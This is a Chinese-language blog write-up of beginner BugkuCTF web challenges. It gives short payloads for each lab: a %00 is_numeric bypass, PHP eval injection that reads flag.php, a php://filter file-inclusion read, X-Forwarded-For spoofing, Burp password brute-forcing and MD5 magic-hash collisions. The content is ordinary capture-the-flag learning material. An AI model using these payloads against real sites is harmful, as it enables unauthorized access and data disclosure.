<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="BugkuCTF Web Writeup"><meta name="keywords" content="CTF,Writeup"><meta name="author" content="Gard3nia"><meta name="copyright" content="Gard3nia"><title>BugkuCTF Web Writeup | Gard3nia's Notebook</title><link rel="shortcut icon" href="/rea.jpg"><link rel="stylesheet" href="/css/index.css?version=1.5.6"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.5.6"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  }
} </script></head><body><canvas class="fireworks"></canvas><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="Toggle article">Toggle site</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">Catalog</div><div class="sidebar-toc__progress"><span class="progress-notice">You've read</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#正文"><span class="toc-number">2.</span> <span class="toc-text">正文</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web2"><span class="toc-number">2.1.</span> <span class="toc-text">web2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#计算器"><span class="toc-number">2.2.</span> <span class="toc-text">计算器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web基础-GET"><span class="toc-number">2.3.</span> <span class="toc-text">web基础$_GET</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web基础-POST"><span class="toc-number">2.4.</span> <span class="toc-text">web基础$_POST</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#矛盾"><span class="toc-number">2.5.</span> <span class="toc-text">矛盾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web3"><span class="toc-number">2.6.</span> <span class="toc-text">web3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#域名解析"><span class="toc-number">2.7.</span> <span class="toc-text">域名解析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#你必须让他停下"><span class="toc-number">2.8.</span> <span class="toc-text">你必须让他停下</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#本地包含"><span class="toc-number">2.9.</span> <span class="toc-text">本地包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#变量1"><span class="toc-number">2.10.</span> <span class="toc-text">变量1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web5"><span class="toc-number">2.11.</span> <span class="toc-text">Web5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#头等舱"><span class="toc-number">2.12.</span> <span class="toc-text">头等舱</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#网站被黑"><span class="toc-number">2.13.</span> <span class="toc-text">网站被黑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#管理员系统"><span class="toc-number">2.14.</span> <span class="toc-text">管理员系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web4"><span class="toc-number">2.15.</span> <span class="toc-text">web4</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#flag在index里"><span class="toc-number">2.16.</span> <span class="toc-text">flag在index里</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#输入密码查看flag"><span class="toc-number">2.17.</span> <span class="toc-text">输入密码查看flag</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#点击一百万次"><span class="toc-number">2.18.</span> <span class="toc-text">点击一百万次</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#备份是个好习惯"><span class="toc-number">2.19.</span> <span class="toc-text">备份是个好习惯</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Gard3nia</div><div class="author-info__description text-center"></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">31</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">9</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">friendlinks</div><a class="author-info-links__name text-center" href="https://skysec.top">一叶飘零学长</a><a class="author-info-links__name text-center" href="https://0verwatch.top/">0verwatch</a><a class="author-info-links__name text-center" href="http://chaosec.top/">瑞雪师傅</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://s2.ax1x.com/2019/05/26/VE5mHf.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Gard3nia's Notebook</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">主页</a><a class="site-page" href="/archives">时间轴</a><a class="site-page" href="/tags">标签</a><a class="site-page" href="/categories">归档</a><a class="site-page" href="/about">简介</a></span></div><div id="post-info"><div id="post-title">BugkuCTF Web Writeup</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2018-12-01</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/Writeup/">Writeup</a><div class="post-meta-wordcount"><span>Word count: </span><span class="word-count">1.4k</span><span class="post-meta__separator">|</span><span>Reading time: 5 min</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>萌新就要多刷题…<a id="more"></a></p>
<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p>flag在源码的注释里</p>
<h2 id="计算器"><a href="#计算器" class="headerlink" title="计算器"></a>计算器</h2><p>改一下text文本框的最大输入位数&gt;1即可</p>
<h2 id="web基础-GET"><a href="#web基础-GET" class="headerlink" title="web基础$_GET"></a>web基础$_GET</h2><p>GET方式传参即可</p>
<h2 id="web基础-POST"><a href="#web基础-POST" class="headerlink" title="web基础$_POST"></a>web基础$_POST</h2><p>post方式传参即可</p>
<h2 id="矛盾"><a href="#矛盾" class="headerlink" title="矛盾"></a>矛盾</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span>=<span class="variable">$_GET</span>[<span class="string">'num'</span>];</span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$num</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$num</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span>==1)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'flag&#123;**********&#125;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这题要求传参num不能是数字，而且num=1，一开始没有什么思路，认为是弱类型的绕过，传了true进去，发现无效，问了一下度娘，发现在数字后面加上%00截断，is_numeric()函数就不能识别为数字了…<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123.206.87.240:8002/get/index1.php?num=1%00</span><br></pre></td></tr></table></figure></p>
<h2 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h2><p>这题疯狂弹出对话框，阻止以后查看源码，果然全是alert弹窗，在最下面的注释里发现了一大串编码，不太认识：<br><img src="https://s1.ax1x.com/2018/12/01/FnGL36.png" alt=""><br>问了一下度娘，发现是unicode，直接在线解码即可</p>
<h2 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h2><p>进入windows/system32/drivers/etc/hosts中添加<strong>123.206.87.240  flag.baidu.com</strong>，然后直接访问域名即可</p>
<h2 id="你必须让他停下"><a href="#你必须让他停下" class="headerlink" title="你必须让他停下"></a>你必须让他停下</h2><p>这题如何让他停下?直接bp抓包拦截，然后一次一次执行，go了几次发现flag<br><img src="https://s1.ax1x.com/2018/12/01/FnJZDg.png" alt=""></p>
<h2 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    include <span class="string">"flag.php"</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">'hello'</span>];</span><br><span class="line">    <span class="built_in">eval</span>( <span class="string">"var_dump(<span class="variable">$a</span>);"</span>);</span><br><span class="line">    show_source(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>REQUEST默认情况下包含了 $_GET，$_POST 和 $_COOKIE 的数组。<br>这题的最终目的就是要看到<strong>flag.php</strong>里的内容，eval是执行$a里的内容，所以直接file(‘flag.php’)就可以<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8003/?hello=file(%27flag.php%27)</span><br></pre></td></tr></table></figure></p>
<h2 id="变量1"><a href="#变量1" class="headerlink" title="变量1"></a>变量1</h2><p>这题花了点时间研究了一下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">flag In the variable !</span><br><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">error_reporting(0);</span><br><span class="line">include <span class="string">"flag1.php"</span>;</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'args'</span>]))&#123;</span><br><span class="line">    <span class="variable">$args</span> = <span class="variable">$_GET</span>[<span class="string">'args'</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"/^\w+$/"</span>,<span class="variable">$args</span>))&#123;</span><br><span class="line">        die(<span class="string">"args error!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">"var_dump($<span class="variable">$args</span>);"</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p><strong>理解1</strong>：preg_match()是正则表达式的匹配，/^表示开始，$/表示结束，结束字符 \w包含[a-z,A-Z,,0-9]中的字符，+代表可以有一个或多个;<br><strong>理解2</strong>：$$args表示的是以$args为变量名的变量;<br><strong>理解3</strong>：$GLOBALS[]包含正在执行脚本所有超级全局变量的引用内容;<br>开头就提示flag在变量里，所以只要看看变量里都放了些什么就可以了，args=GLOABLS就可以将$$args解析成$GLOBALS,var_dump打印变量的相关信息<br>这样就可以显示出所有变量的内容<br><img src="https://s1.ax1x.com/2018/12/01/FnJjGq.png" alt=""><br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8004/index1.php?args=GLOBALS</span><br></pre></td></tr></table></figure></p>
<h2 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h2><p>提示是jspfuck，查看源代码，复制下来放到google控制台跑一下<br><img src="https://s1.ax1x.com/2018/12/01/FnYWmF.png" alt=""><br>发现了ctf{whatfk}，提交提示离答案非常接近，要求是CTF头，所以全部大写提交，成功…</p>
<h2 id="头等舱"><a href="#头等舱" class="headerlink" title="头等舱"></a>头等舱</h2><p>打开发现什么都没有…查看源代码也没有什么东西，F12查看一波也没有什么发现，无奈之下用bp截取之后运行…以为有点难，没想到是水题…<br><img src="https://s1.ax1x.com/2018/12/01/FntDBD.png" alt=""></p>
<h2 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h2><p>嗯，挺漂亮的网页，查看半天也没发现什么奇怪的东西，就扫一波后台目录<br><img src="https://s1.ax1x.com/2018/12/01/FndK54.png" alt=""><br>发现了index.php和shell.php，打开shell.php如图：<br><img src="https://s1.ax1x.com/2018/12/01/FndlG9.png" alt=""><br>发现需要输入密码，bp抓一波，然后选择passwords字典暴力破解<br><img src="https://s1.ax1x.com/2018/12/01/Fn6vKH.png" alt=""><br>降序排列一波发现1110匹配项<br><img src="https://s1.ax1x.com/2018/12/01/Fnc9at.png" alt=""></p>
<h2 id="管理员系统"><a href="#管理员系统" class="headerlink" title="管理员系统"></a>管理员系统</h2><p>这题不太会，找到源码中的base64编码<br><img src="https://s1.ax1x.com/2018/12/01/Fn2QvF.png" alt=""><br>解码以后是test123，输入admin为用户名，test123为密码，发现不能访问，IP禁止访问，请联系本地管理员登录，也就是说需要本地登录才可以进去，所以就尝试着bp抓一波包，从大佬的wp中了解到这题需要<strong>伪装成本地访问</strong>才可以通过，伪装本地访问的方法就是在headers里面添加如下http头：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure></p>
<p><img src="https://s1.ax1x.com/2018/12/01/Fn2c5t.png" alt=""><br>弹出flag：<br><img src="https://s1.ax1x.com/2018/12/01/Fn2Ibj.png" alt=""></p>
<h2 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h2><p>提示查看源码就查看一波源码，发现一大串url编码：<br><img src="https://s1.ax1x.com/2018/12/01/Fn2TVs.png" alt=""><br>解码后：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> checkSubmit()</span><br><span class="line">&#123;</span><br><span class="line">	var a=document.getElementById(<span class="string">"password"</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="string">"undefined"</span>!=typeof a)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="string">"67d709b2b54aa2aa648cf6e87a7114f1"</span>==a.value)</span><br><span class="line">		<span class="built_in">return</span>!0;</span><br><span class="line">		alert(<span class="string">"Error"</span>);</span><br><span class="line">		a.focus();</span><br><span class="line">		<span class="built_in">return</span>!1</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">document.getElementById(<span class="string">"levelQuest"</span>).onsubmit=checkSubmit;</span><br></pre></td></tr></table></figure></p>
<p>将67d709b2b54aa2aa648cf6e87a7114f1这一串数字提交到表单里直接出flag…(什么鬼玩意儿)<br><img src="https://s1.ax1x.com/2018/12/01/FnRpZ9.png" alt=""></p>
<h2 id="flag在index里"><a href="#flag在index里" class="headerlink" title="flag在index里"></a>flag在index里</h2><p>文件包含题，和nctf的文件包含如出一辙；<br>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8005/post/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></p>
<p>解析为base64编码，解码后发现flag</p>
<h2 id="输入密码查看flag"><a href="#输入密码查看flag" class="headerlink" title="输入密码查看flag"></a>输入密码查看flag</h2><p>进去发现需要输入5位密码,就直接用burp爆破一下，先设置五位数字爆破<br><img src="https://s1.ax1x.com/2018/12/02/FKk4JJ.png" alt=""><br>等一下发现出现length不一样的项目，直接找到了flag<br><img src="https://s1.ax1x.com/2018/12/02/FKk5W9.png" alt=""></p>
<h2 id="点击一百万次"><a href="#点击一百万次" class="headerlink" title="点击一百万次"></a>点击一百万次</h2><p>这题你点一下鼠标数值就会加一，<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    var clicks=0</span><br><span class="line">    $(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">      $(<span class="string">"#cookie"</span>)</span><br><span class="line">        .mousedown(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">          $(this).width(<span class="string">'350px'</span>).height(<span class="string">'350px'</span>);</span><br><span class="line">        &#125;)</span><br><span class="line">        .mouseup(<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">          $(this).width(<span class="string">'375px'</span>).height(<span class="string">'375px'</span>);</span><br><span class="line">          clicks++;</span><br><span class="line">          $(<span class="string">"#clickcount"</span>).text(clicks);</span><br><span class="line">          <span class="keyword">if</span>(clicks &gt;= 1000000)&#123;</span><br><span class="line">          	var form = $(<span class="string">'&lt;form action="" method="post"&gt;'</span> +</span><br><span class="line">						<span class="string">'&lt;input type="text" name="clicks" value="'</span> + clicks + <span class="string">'" hidden/&gt;'</span> +</span><br><span class="line">						<span class="string">'&lt;/form&gt;'</span>);</span><br><span class="line">						$(<span class="string">'body'</span>).append(form);</span><br><span class="line">						form.submit();</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>查看源代码发现只要点击鼠标就会clicks++，method是POST，所以可以直接post一个clicks=1000000过去就可以了<br><img src="https://s1.ax1x.com/2018/12/02/FKAuyq.png" alt=""><br>得到flag<br><img src="https://s1.ax1x.com/2018/12/02/FKAlwT.png" alt=""></p>
<h2 id="备份是个好习惯"><a href="#备份是个好习惯" class="headerlink" title="备份是个好习惯"></a>备份是个好习惯</h2><p>提示备份直接进入index.php.bak,发现如下,是一个弱类型的MD5绕过，构造MD5值为0e开头的值就可以了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * Created by PhpStorm.</span><br><span class="line"> * User: Norse</span><br><span class="line"> * Date: 2017/8/6</span><br><span class="line"> * Time: 20:22</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">include_once <span class="string">"flag.php"</span>;</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, 0);</span><br><span class="line"><span class="variable">$str</span> = strstr(<span class="variable">$_SERVER</span>[<span class="string">'REQUEST_URI'</span>], <span class="string">'?'</span>);</span><br><span class="line"><span class="variable">$str</span> = substr(<span class="variable">$str</span>,1);//返回从1到后面的字符</span><br><span class="line"><span class="variable">$str</span> = str_replace(<span class="string">'key'</span>,<span class="string">''</span>,<span class="variable">$str</span>);//key替换为<span class="string">''</span></span><br><span class="line">parse_str(<span class="variable">$str</span>);//字符串解析到变量</span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key1</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> md5(<span class="variable">$key2</span>);</span><br><span class="line"><span class="keyword">if</span>(md5(<span class="variable">$key1</span>) == md5(<span class="variable">$key2</span>) &amp;&amp; <span class="variable">$key1</span> !== <span class="variable">$key2</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$flag</span>.<span class="string">"取得flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>去掉第一个字符后，用’’替换key，也就是直接去掉key，然后字符串解析到变量，构造payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://123.206.87.240:8002/web16/?kekeyy1=s878926199a&amp;kekeyy2=QNKCDZO</span><br></pre></td></tr></table></figure></p>
<hr>
<p>持续更新…</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Gard3nia</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://gardenia30.top/2018/12/01/BugkuCTF-Web-Writeup/">https://gardenia30.top/2018/12/01/BugkuCTF-Web-Writeup/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2018/12/19/密码学课程设计之DES对称加密/"><i class="fa fa-chevron-left">  </i><span>密码学课程设计之DES对称加密</span></a></div><div class="next-post pull-right"><a href="/2018/11/30/BugkuCTF代码审计writeup/"><span>BugkuCTF代码审计Writeup</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Gard3nia</div><div class="framework-info"><span>Driven - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">Just keep moving!</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.5.6"></script><script src="/js/fancybox.js?version=1.5.6"></script><script src="/js/sidebar.js?version=1.5.6"></script><script src="/js/copy.js?version=1.5.6"></script><script src="/js/fireworks.js?version=1.5.6"></script><script src="/js/transition.js?version=1.5.6"></script><script src="/js/scroll.js?version=1.5.6"></script><script src="/js/head.js?version=1.5.6"></script></body></html>